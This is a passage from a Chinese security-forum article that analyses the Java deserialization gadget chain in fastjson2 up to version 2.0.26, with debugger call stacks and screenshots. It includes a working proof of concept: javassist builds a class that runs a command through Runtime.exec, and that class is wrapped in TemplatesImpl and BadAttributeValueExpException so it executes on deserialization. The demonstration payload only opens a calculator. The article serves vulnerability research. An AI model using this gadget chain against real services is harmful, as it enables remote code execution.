---
title: 一文带你看懂fastjson2下的反序列化调用链完整过程
url: https://forum.butian.net/share/4602
source: 奇安信攻防社区
date: 2026-01-30
fetch_date: 2026-01-31T04:00:15.136377
---

# 一文带你看懂fastjson2下的反序列化调用链完整过程

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一文带你看懂fastjson2下的反序列化调用链完整过程

来分析一下fastjson2下的反序列化调用链全过程

fastjson2下的反序列化调用链分析
====================
### 前言
在前面fastjson1下的反序列化调用链分析中，简单提到过fastjson2下的反序列化调用链，但是当时fastjson2的能打的版本为&lt;=2.0.26。现在先来具体看看这个版本下的调试分析。
### Fastjson2&lt;=2.0.26调试分析
依赖版本改成如下即可：
```xml
<!-- <https://mvnrepository.com/artifact/com.alibaba/fastjson> -->
<dependency>
<groupId>com.alibaba</groupId>
<artifactId>fastjson</artifactId>
<version>2.0.26</version>
</dependency>
```
当时使用的poc如下：
```java
package org.example;
import javax.management.BadAttributeValueExpException;
import com.alibaba.fastjson.JSONObject;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.\*;
import java.lang.reflect.Field;
public class Main{
public static void main(String[] args) throws Exception {
//使用javassist定义恶意代码
ClassPool classPool = ClassPool.getDefault();
classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
CtClass cc = classPool.makeClass("Evil");
String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
cc.makeClassInitializer().insertBefore(cmd);
cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
byte[] classBytes = cc.toBytecode();
byte[][] code = new byte[][]{classBytes};
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "\_bytecodes", code);
setFieldValue(templates, "\_name", "fupanc");
setFieldValue(templates, "\_class", null);
setFieldValue(templates, "\_tfactory", new TransformerFactoryImpl());
JSONObject jsonObject = new JSONObject();
jsonObject.put("fupanc",templates);
BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
Field field = bad.getClass().getDeclaredField("val");
field.setAccessible(true);
field.set(bad, jsonObject);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("ser.ser"));
out.writeObject(bad);
out.close();
ObjectInputStream in = new ObjectInputStream(new FileInputStream("ser.ser"));
in.readObject();
in.close();
}
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
final Field field = obj.getClass().getDeclaredField(fieldName);
field.setAccessible(true);
field.set(obj, value);
}
}
```
运行即可弹出计算机。
其实主要的点还是在于调用toString()方法，直接将代码改简单些来调试分析一下流程：
```java
package org.example;
import com.alibaba.fastjson.JSONObject;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
public class Main{
public static void main(String[] args) throws Exception {
//使用javassist定义恶意代码
ClassPool classPool = ClassPool.getDefault();
classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
CtClass cc = classPool.makeClass("Evil");
String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
cc.makeClassInitializer().insertBefore(cmd);
cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
byte[] classBytes = cc.toBytecode();
byte[][] code = new byte[][]{classBytes};
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "\_bytecodes", code);
setFieldValue(templates, "\_name", "fupanc");
setFieldValue(templates, "\_class", null);
setFieldValue(templates, "\_tfactory", new TransformerFactoryImpl());
JSONObject jsonObject = new JSONObject();
jsonObject.put("fupanc",templates);
jsonObject.toString();
}
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
final Field field = obj.getClass().getDeclaredField(fieldName);
field.setAccessible(true);
field.set(obj, value);
}
}
```
直接打断点于getOutputProperties()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-9d2bfdc0cd65332cb4d42cee07e8a3e386d699c2.png)
调试直接成功断在这里，此时的调用栈为：
```php
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
write:-1, OWG\_1\_3\_TemplatesImpl (com.alibaba.fastjson2.writer)
write:548, ObjectWriterImplMap (com.alibaba.fastjson2.writer)
toJSONString:2388, JSON (com.alibaba.fastjson2)
toString:1028, JSONObject (com.alibaba.fastjson)
main:32, Main (org.example)
```
朴实无华，但是从中还是可以看到之前fastjson1分析下的一些影子，比如：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-dbe1d0a5623ca224ec0ede83355ee176b03e90fd.png)
很熟悉的获取ObjectWriter相关类并调用它的write()方法来进行序列化。
现在来跟一下具体细节，看一下对序列化类的处理逻辑。
打断点于toString()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-748febbeabe7a9f21aad431989a1fef7dba5524c.png)
这里的JSONWriter的Feature是一个枚举类型的类：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-bd62774d03801386d65ca683ff4a6b326cb0cc4a.png)
里面就有我们获取的定义在这个类中的ReferenceDetection值。
后面发现JSONObject类在fastjson2中其实有两个：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-f6cee8f1eceb9ff0bbe55215fdf9faf831c25ea2.png)
在前面我们都是使用的fastjson1的JSONObject来分析，两个都能弹，并且其实调试下来最终的调用方法是一样的，这里就直接调试分析fastjson2的JSONObject过程了，直接在import处将代码改成fastjson2即可。然后打断点调试，直接断于JSONObject类的toString()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-5c1b9ff29bdedec58ce84ba78406c685a23afb47.png)
跟进这个JSONWriter类的of()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-de91d9d5d417702a297d6a28e6fb52fa8c05e47d.png)
最后也是返回了这个jsonWriter变量，现在来看看createWriteContext()的调用获取情况以及JSONWriterUTF16JDK8类的实例化情况，后续会用到类中的变量，要搞清楚对应变量的赋值以及调用，重新调试单击进入JSONFactory类的createWriteContext()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-94da9e328c60ae30a4cf7e91226838b7011aa20c.png)
这里的defaultObjectWriterProvider是静态的直接默认的变量：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-afc1287de29f171cb058123cf99b7d7b84270714.png)
继续跟进JSONWriter类的内部类Context类的初始化：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-ccc3915643a316e482dc560b537357338e2aa80d.png)
也就是将features赋值为0，然后将参数传递的ObjectWriterProvider类的实例化对象赋值给了provider。
最后返回了这个Context类，然后一直返回，回到JSONWriterUTF16JDK8类的初始化：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-d86fc5bb91fdc993724b848ddb1451456d886fce.png)
继续往父类初始化：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-a81aebcb2078a14c591cab9859bead247818287f.png)
继续往父类看：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-36f9ef5540c4b9ffc8b58a8be369b41ff92e44b2.png)
初始化情况如上，这里的JSONWriter应该是一个和json序列化相关的类。在这个JSONWriter类初始化完毕后，回到其子类JSONWriterUTF16的初始化：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-9a701dfe408b023e3f8439186ed7bab789862074.png)
这里的chars需要关注，后面要提到。可以看到这里的cachedIndex为1，跟进调用的JSONFactory类的allocateCharArray()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-0f1ddf2eb7f4e17a7adbe90a352e45c4e002c73e.png)
可以看到直接静态设置了几个变量，如这里非常重要的CHAR\\_ARRAY\\_CACHE，这是一个二维数组，但是并没有定义值，所以`CHAR\_ARRAY\_CACHE[cacheIndex]`的值为null，从而将这个chars值设置为8192个下表的数组，并且最后返回了这个数组。
而后这个char数组的内容都是默认的占位符吧应该是：
![图片.png](htt...